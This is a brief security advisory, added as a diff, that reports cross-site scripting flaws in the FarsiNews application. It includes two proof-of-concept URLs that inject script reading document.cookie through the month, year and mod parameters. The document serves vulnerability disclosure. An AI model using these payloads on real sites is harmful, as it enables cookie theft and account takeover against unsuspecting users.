@@ -1,0 +1,8 @@
+source: http://www.securityfocus.com/bid/17701/info
+
+FarsiNews is prone to multiple cross-site scripting vulnerabilities. These issues are due to the application's failure to properly sanitize user-supplied input. 
+
+An attacker may leverage these issues to have arbitrary script code executed in the browser of an unsuspecting user in the context of the affected site. This may help the attacker steal cookie-based authentication credentials and launch other attacks.
+
+http://www.example.com/[farsinews_path]/index.php?month=%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E%3C!--&year=%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E%3C!--
+http://www.example.com/[farsinews_path]/admin.php?mod=%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E%3C !--
